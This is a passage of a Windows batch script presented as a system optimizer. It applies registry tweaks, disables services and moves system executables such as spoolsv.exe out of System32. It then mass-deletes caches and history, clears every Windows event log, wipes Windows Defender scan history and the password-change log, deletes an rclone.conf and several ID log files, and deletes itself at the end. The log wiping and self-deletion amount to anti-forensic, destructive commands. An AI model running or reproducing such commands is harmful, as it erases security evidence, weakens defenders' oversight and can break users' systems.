Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultD3TransitionLatencyIdleVeryLongTime" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceIdle0" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceIdle0MonitorOff" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceIdle1" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceIdle1MonitorOff" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceMemory" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceNoContext" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceNoContextMonitorOff" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceOther" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceTimerPeriod" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultMemoryRefreshLatencyToleranceActivelyUsed" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultMemoryRefreshLatencyToleranceMonitorOff" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultMemoryRefreshLatencyToleranceNoContext" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "Latency" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "MaxIAverageGraphicsLatencyInOneBucket" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "MiracastPerfTrackGraphicsLatency" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "MonitorLatencyTolerance" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "MonitorRefreshLatencyTolerance" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "TransitionLatency" /t REG_DWORD /d "1" /f >nul
@timeout /t 03 >nul
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\CPU\HardCap0" /v "CapPercentage" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\CPU\HardCap0" /v "SchedulingType" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\CPU\Paused" /v "CapPercentage" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\CPU\Paused" /v "SchedulingType" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\CPU\SoftCapFull" /v "CapPercentage" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\CPU\SoftCapFull" /v "SchedulingType" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\CPU\SoftCapLow" /v "CapPercentage" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\CPU\SoftCapLow" /v "SchedulingType" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Flags\BackgroundDefault" /v "IsLowPriority" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Flags\Frozen" /v "IsLowPriority" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Flags\FrozenDNCS" /v "IsLowPriority" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Flags\FrozenDNK" /v "IsLowPriority" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Flags\FrozenPPLE" /v "IsLowPriority" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Flags\Paused" /v "IsLowPriority" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Flags\PausedDNK" /v "IsLowPriority" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Flags\Pausing" /v "IsLowPriority" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Flags\PrelaunchForeground" /v "IsLowPriority" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Flags\ThrottleGPUInterference" /v "IsLowPriority" /t REG_DWORD /d "0" /f >nul
@timeout /t 03 >nul
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\Critical" /v "BasePriority" /t REG_DWORD /d "82" /f >nul
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\Critical" /v "OverTargetPriority" /t REG_DWORD /d "50" /f >nul
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\CriticalNoUi" /v "BasePriority" /t REG_DWORD /d "82" /f >nul
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\CriticalNoUi" /v "OverTargetPriority" /t REG_DWORD /d "50" /f >nul
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\EmptyHostPPLE" /v "BasePriority" /t REG_DWORD /d "82" /f >nul
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\EmptyHostPPLE" /v "OverTargetPriority" /t REG_DWORD /d "50" /f >nul
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\High" /v "BasePriority" /t REG_DWORD /d "82" /f >nul
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\High" /v "OverTargetPriority" /t REG_DWORD /d "50" /f >nul
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\Low" /v "BasePriority" /t REG_DWORD /d "82" /f >nul
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\Low" /v "OverTargetPriority" /t REG_DWORD /d "50" /f >nul
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\Lowest" /v "BasePriority" /t REG_DWORD /d "82" /f >nul
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\Lowest" /v "OverTargetPriority" /t REG_DWORD /d "50" /f >nul
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\Medium" /v "BasePriority" /t REG_DWORD /d "82" /f >nul
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\Medium" /v "OverTargetPriority" /t REG_DWORD /d "50" /f >nul
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\MediumHigh" /v "BasePriority" /t REG_DWORD /d "82" /f >nul
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\MediumHigh" /v "OverTargetPriority" /t REG_DWORD /d "50" /f >nul
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\StartHost" /v "BasePriority" /t REG_DWORD /d "82" /f >nul
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\StartHost" /v "OverTargetPriority" /t REG_DWORD /d "50" /f >nul
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\VeryHigh" /v "BasePriority" /t REG_DWORD /d "82" /f >nul
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\VeryHigh" /v "OverTargetPriority" /t REG_DWORD /d "50" /f >nul
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\VeryLow" /v "BasePriority" /t REG_DWORD /d "82" /f >nul
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\VeryLow" /v "OverTargetPriority" /t REG_DWORD /d "50" /f >nul
@timeout /t 03 >nul
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize" /v "EnableTransparency" /t REG_DWORD /d "1" /f >nul
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize" /v "AppsUseLightTheme" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize" /v "SystemUsesLightTheme" /t REG_DWORD /d "0" /f >nul
Reg.exe add "HKCU\Control Panel\Desktop" /v "DragFullWindows" /t REG_SZ /d "1" /f >nul
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ListviewAlphaSelect" /t REG_DWORD /d "1" /f >nul
Exit /b

:ENDSCR
cd %systemdrive%\Ect
sc config "Schedule" start=disabled
sc config "WSearch" start=disabled
sc config "SysMain" start=disabled
sc config "AMD Crash Defender Service" start=disabled
sc config "AMD External Events Utility" start=disabled
taskkill /F /IM spoolsv.exe
taskkill /F /IM HelpPane.exe
taskkill /F /IM splwow64.exe
taskkill /F /IM winhlp32.exe
taskkill /F /IM hh.exe

@timeout /t 04>nul

md %systemdrive%\Ect
md %systemdrive%\Ect\OLD
attrib -h -s "C:\HGD-OBYSS.bat"

PowerRun_x64.exe /SW:0 cmd.exe /k "IF EXIST C:\Windows\System32\spoolsv.exe move /Y C:\Windows\System32\spoolsv.exe C:\Ect\OLD"
PowerRun_x64.exe /SW:0 cmd.exe /k "IF EXIST C:\Windows\HelpPane.exe move /Y C:\Windows\HelpPane.exe C:\Ect\OLD"
PowerRun_x64.exe /SW:0 cmd.exe /k "IF EXIST C:\Windows\splwow64.exe move /Y C:\Windows\splwow64.exe C:\Ect\OLD"
PowerRun_x64.exe /SW:0 cmd.exe /k "IF EXIST C:\Windows\winhlp32.exe move /Y C:\Windows\winhlp32.exe C:\Ect\OLD"
PowerRun_x64.exe /SW:0 cmd.exe /k "IF EXIST C:\Windows\System32\mobsync.exe move /Y C:\Windows\System32\mobsync.exe C:\Ect\OLD"

rd /s /q C:\PerfLogs
rd /s /q C:\$HardLinkBackup
rd /s /q c:\windows\tmp
del /q /f /s %TEMP%\*
del /s /f /q c:\windows\temp\*.*
rd /s /q C:\Users\%username%\AppData\LocalLow\AMD\DxCache
rd /s /q %localappdata%\AMD
del /s /f /q c:\WINDOWS\Prefetch
del /s /f /q %temp%\*.*
rd /s /q c:\windows\tempor~1
rd /s /q c:\windows\temp
rd /s /q c:\windows\tmp
rd /s /q %username%\AppData\Local\AMD
rd /s /q c:\windows\ff*.tmp
rd /s /q c:\windows\history
rd /s /q c:\windows\cookies
rd /s /q c:\windows\recent
rd /s /q c:\windows\spool\printers
del /F /Q "%USERPROFILE%\Documents\*.tmp" 2>NUL
del /F /Q "%USERPROFILE%\My Documents\*.tmp" 2>NUL
del /F /S /Q "%USERPROFILE%\*.blf" 2>NUL
del /F /Q "%SYSTEMDRIVE%\Ect\Optimizer\*.tmp" 2>NUL
del /F /S /Q "%USERPROFILE%\*.regtrans-ms" 2>NUL
del /F /S /Q "%USERPROFILE%\AppData\LocalLow\Sun\Java\*" 2>NUL
del /F /S /Q "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Cache\*" 2>NUL
del /F /S /Q "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\JumpListIconsOld\*" 2>NUL
del /F /S /Q "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\JumpListIcons\*" 2>NUL
del /F /S /Q "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Local Storage\http*.*" 2>NUL
del /F /S /Q "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Media Cache\*" 2>NUL
del /F /S /Q "%USERPROFILE%\AppData\Local\Microsoft\Internet Explorer\Recovery\*" 2>NUL
del /F /S /Q "%USERPROFILE%\AppData\Local\Microsoft\Terminal Server Client\Cache\*" 2>NUL
del /F /S /Q "%USERPROFILE%\AppData\Local\Microsoft\Windows\Caches\*" 2>NUL
del /F /S /Q "%USERPROFILE%\AppData\Local\Microsoft\Windows\Explorer\*" 2>NUL
del /F /S /Q "%USERPROFILE%\AppData\Local\Microsoft\Windows\History\low\*" /AH 2>NUL
del /F /S /Q "%USERPROFILE%\AppData\Local\Microsoft\Windows\INetCache\*" 2>NUL
del /F /S /Q "%USERPROFILE%\AppData\Local\Microsoft\Windows\Temporary Internet Files\*" 2>NUL
del /F /S /Q "%USERPROFILE%\AppData\Local\Microsoft\Windows\WER\ReportArchive\*" 2>NUL
del /F /S /Q "%USERPROFILE%\AppData\Local\Microsoft\Windows\WER\ReportQueue\*" 2>NUL
del /F /S /Q "%USERPROFILE%\AppData\Local\Microsoft\Windows\WebCache\*" 2>NUL
del /F /S /Q "%USERPROFILE%\AppData\Local\Temp\*" 2>NUL
del /F /S /Q "%USERPROFILE%\AppData\Roaming\Adobe\Flash Player\*" 2>NUL
del /F /S /Q "%USERPROFILE%\AppData\Roaming\Microsoft\Teams\Service Worker\CacheStorage\*" 2>NUL
del /F /S /Q "%USERPROFILE%\AppData\Roaming\Macromedia\Flash Player\*" 2>NUL
del /F /S /Q "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Recent\*" 2>NUL
del /F /S /Q "%USERPROFILE%\Application Data\Adobe\Flash Player\*" 2>NUL
del /F /S /Q "%USERPROFILE%\Application Data\Macromedia\Flash Player\*" 2>NUL
del /F /S /Q "%USERPROFILE%\Application Data\Microsoft\Dr Watson\*" 2>NUL
del /F /S /Q "%USERPROFILE%\Application Data\Microsoft\Windows\WER\ReportArchive\*" 2>NUL
del /F /S /Q "%USERPROFILE%\Application Data\Microsoft\Windows\WER\ReportQueue\*" 2>NUL
del /F /S /Q "%USERPROFILE%\Application Data\Sun\Java\*" 2>NUL
del /F /S /Q "%USERPROFILE%\Local Settings\Application Data\ApplicationHistory\*" 2>NUL
del /F /S /Q "%USERPROFILE%\Local Settings\Application Data\Google\Chrome\User Data\Default\Cache\*" 2>NUL
del /F /S /Q "%USERPROFILE%\Local Settings\Application Data\Google\Chrome\User Data\Default\JumpListIconsOld\*" 2>NUL
del /F /S /Q "%USERPROFILE%\Local Settings\Application Data\Google\Chrome\User Data\Default\JumpListIcons\*" 2>NUL
del /F /S /Q "%USERPROFILE%\Local Settings\Application Data\Google\Chrome\User Data\Default\Local Storage\http*.*" 2>NUL
del /F /S /Q "%USERPROFILE%\Local Settings\Application Data\Google\Chrome\User Data\Default\Media Cache\*" 2>NUL
del /F /S /Q "%USERPROFILE%\Local Settings\Application Data\Microsoft\Dr Watson\*" 2>NUL
del /F /S /Q "%USERPROFILE%\Local Settings\Application Data\Microsoft\Internet Explorer\Recovery\*" 2>NUL
del /F /S /Q "%USERPROFILE%\Local Settings\Application Data\Microsoft\Terminal Server Client\Cache\*" 2>NUL
del /F /S /Q "%USERPROFILE%\Local Settings\Temp\*" 2>NUL
del /F /S /Q "%USERPROFILE%\Local Settings\Temporary Internet Files\*" 2>NUL
del /F /S /Q "%USERPROFILE%\Recent\*" 2>NUL
if exist %SystemDrive%\Windows.old\ (
	 takeown /F %SystemDrive%\Windows.old\* /R /A /D Y
	 echo y| cacls %SystemDrive%\Windows.old\*.* /C /T /grant administrators:F
	 rmdir /S /Q %SystemDrive%\Windows.old\
	 )

if exist %SystemDrive%\$Windows.~BT\ (
	 takeown /F %SystemDrive%\$Windows.~BT\* /R /A
	 icacls %SystemDrive%\$Windows.~BT\*.* /T /grant administrators:F
	 rmdir /S /Q %SystemDrive%\$Windows.~BT\
	 )

if exist %SystemDrive%\$Windows.~WS (
	 takeown /F %SystemDrive%\$Windows.~WS\* /R /A
	 icacls %SystemDrive%\$Windows.~WS\*.* /T /grant administrators:F
	 rmdir /S /Q %SystemDrive%\$Windows.~WS\
	 )

cls
echo --- Clear regedit last key
Reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit" /va /f
Reg.exe delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Applets\Regedit" /va /f
cls
echo --- Clear regedit favorites
Reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit\Favorites" /va /f
Reg.exe delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Applets\Regedit\Favorites" /va /f
cls
echo --- Clear list of recent programs opened
Reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU" /va /f
Reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRULegacy" /va /f
cls
echo --- Clear Adobe Media Browser MRU
Reg.exe delete "HKCU\Software\Adobe\MediaBrowser\MRU" /va /f
cls
echo --- Clear MSPaint MRU
Reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\Paint\Recent File List" /va /f
Reg.exe delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Applets\Paint\Recent File List" /va /f
cls
echo --- Clear Wordpad MRU
Reg.exe delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Applets\Wordpad\Recent File List" /va /f
cls
echo --- Clear Map Network Drive MRU MRU
Reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Map Network Drive MRU" /va /f
Reg.exe delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Map Network Drive MRU" /va /f
cls
echo --- Clear Windows Search Assistant history
Reg.exe delete "HKCU\Software\Microsoft\Search Assistant\ACMru" /va /f
cls
echo --- Clear list of Recent Files Opened, by Filetype
Reg.exe delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /va /f
Reg.exe delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /va /f
Reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSaveMRU" /va /f
cls
echo --- Clear windows media player recent files and URLs
Reg.exe delete "HKCU\Software\Microsoft\MediaPlayer\Player\RecentFileList" /va /f
Reg.exe delete "HKCU\Software\Microsoft\MediaPlayer\Player\RecentURLList" /va /f
Reg.exe delete "HKLM\SOFTWARE\Microsoft\MediaPlayer\Player\RecentFileList" /va /f
Reg.exe delete "HKLM\SOFTWARE\Microsoft\MediaPlayer\Player\RecentURLList" /va /f
cls
echo --- Clear Most Recent Application's Use of DirectX
Reg.exe delete "HKCU\Software\Microsoft\Direct3D\MostRecentApplication" /va /f
Reg.exe delete "HKLM\SOFTWARE\Microsoft\Direct3D\MostRecentApplication" /va /f
cls
echo --- Clear Windows Run MRU ^& typedpaths
Reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f
Reg.exe delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths" /va /f
cls
echo --- Empty trash bin
PowerShell -ExecutionPolicy Unrestricted -Command "$bin = (New-Object -ComObject Shell.Application).NameSpace(10); $bin.items() | ForEach {; Write-Host "^""Deleting $($_.Name) from Recycle Bin"^""; Remove-Item $_.Path -Recurse -Force; }"
cls
echo --- Clear thumbnail cache
del /f /s /q /a %LocalAppData%\Microsoft\Windows\Explorer\*.db
cls
echo --- Clear Windows temp files
del /f /q %localappdata%\Temp\*
rd /s /q "%WINDIR%\Temp"
rd /s /q "%TEMP%"
cls
echo --- Clear main telemetry file
if exist "%ProgramData%\Microsoft\Diagnosis\ETLLogs\AutoLogger\AutoLogger-Diagtrack-Listener.etl" (
    takeown /f "%ProgramData%\Microsoft\Diagnosis\ETLLogs\AutoLogger\AutoLogger-Diagtrack-Listener.etl" /r /d y
    icacls "%ProgramData%\Microsoft\Diagnosis\ETLLogs\AutoLogger\AutoLogger-Diagtrack-Listener.etl" /grant administrators:F /t
    echo "" > "%ProgramData%\Microsoft\Diagnosis\ETLLogs\AutoLogger\AutoLogger-Diagtrack-Listener.etl"
    echo Clear successful: "%ProgramData%\Microsoft\Diagnosis\ETLLogs\AutoLogger\AutoLogger-Diagtrack-Listener.etl"
) else (
    echo "Main telemetry file does not exist. Good!"
)
cls
echo --- Clear Event Logs in Event Viewer
wevtutil sl Microsoft-Windows-LiveId/Operational /ca:O:BAG:SYD:(A;;0x1;;;SY)(A;;0x5;;;BA)(A;;0x1;;;LA)
for /f "tokens=*" %%i in ('wevtutil.exe el') DO (
    echo Deleting event log: "%%i"
    wevtutil.exe cl %1 "%%i"
)
cls
echo --- Clean Windows Defender scan history
del "%ProgramData%\Microsoft\Windows Defender\Scans\History\" /s /f /q
cls
echo --- Clear Optional Component Manager and COM+ components logs
del /f /q %SystemRoot%\comsetup.log
cls
echo --- Clear Distributed Transaction Coordinator logs
del /f /q %SystemRoot%\DtcInstall.log
cls
echo --- Clear Pending File Rename Operations logs
del /f /q %SystemRoot%\PFRO.log
cls
echo --- Clear Windows Deployment Upgrade Process Logs
del /f /q %SystemRoot%\setupact.log
del /f /q %SystemRoot%\setuperr.log
cls
echo --- Clear Windows Setup Logs
del /f /q %SystemRoot%\setupapi.log
del /f /q %SystemRoot%\Panther\*
del /f /q %SystemRoot%\inf\setupapi.app.log
del /f /q %SystemRoot%\inf\setupapi.dev.log
del /f /q %SystemRoot%\inf\setupapi.offline.log
cls
echo --- Clear Windows System Assessment Tool logs
del /f /q %SystemRoot%\Performance\WinSAT\winsat.log
cls
echo --- Clear Password change events
del /f /q %SystemRoot%\debug\PASSWD.LOG
cls
echo --- Clear user web cache database
del /f /q %localappdata%\Microsoft\Windows\WebCache\*.*
cls
echo --- Clear system temp folder when no one is logged in
del /f /q %SystemRoot%\ServiceProfiles\LocalService\AppData\Local\Temp\*.*
cls
echo --- Clear DISM (Deployment Image Servicing and Management) Logs
del /f /q  %SystemRoot%\Logs\CBS\CBS.log
del /f /q  %SystemRoot%\Logs\DISM\DISM.log
cls
echo --- Clear WUAgent (Windows Update History) logs
setlocal EnableDelayedExpansion 
net stop wuauserv
del /q /s /f "%SystemRoot%\SoftwareDistribution"
endlocal
cls
echo --- Clear Server-initiated Healing Events Logs
del /f /q "%SystemRoot%\Logs\SIH\*"
cls
echo --- Common Language Runtime Logs
del /f /q "%LocalAppData%\Microsoft\CLR_v4.0\UsageTraces\*"
del /f /q "%LocalAppData%\Microsoft\CLR_v4.0_32\UsageTraces\*"
cls
echo --- Network Setup Service Events Logs
del /f /q "%SystemRoot%\Logs\NetSetup\*"
cls
echo --- Disk Cleanup tool (Cleanmgr.exe) Logs
del /f /q "%SystemRoot%\System32\LogFiles\setupcln\*"
cls
echo --- Clear Windows update and SFC scan logs
del /f /q %SystemRoot%\Temp\CBS\*
cls
echo --- Clear Windows Update Medic Service logs
takeown /f %SystemRoot%\Logs\waasmedic /r /d y
icacls %SystemRoot%\Logs\waasmedic /grant administrators:F /t
rd /s /q %SystemRoot%\Logs\waasmedic
cls
echo --- Clear Cryptographic Services Traces
del /f /q %SystemRoot%\System32\catroot2\dberr.txt
del /f /q %SystemRoot%\System32\catroot2.log
del /f /q %SystemRoot%\System32\catroot2.jrs
del /f /q %SystemRoot%\System32\catroot2.edb
del /f /q %SystemRoot%\System32\catroot2.chk
cls
echo --- Windows Update Events Logs
del /f /q "%SystemRoot%\Logs\SIH\*"
cls
echo --- Windows Update Logs
del /f /q "%SystemRoot%\Traces\WindowsUpdate\*"
cls
rmdir /s /q %OPLOCATION% >nul 2>&1
cls
IF EXIST "C:\Program Files (x86)\Mozilla Maintenance Service\Uninstall.exe" start "" "C:\Program Files (x86)\Mozilla Maintenance Service\Uninstall.exe" /S
DEL QTS-USRL.log>nul
DEL ID.log>nul
DEL IID.log>nul
DEL temp2.txt>nul
DEL rclone.conf>nul
DEL RWC-USRL.log>nul
cls
DEL "%~f0" & EXIT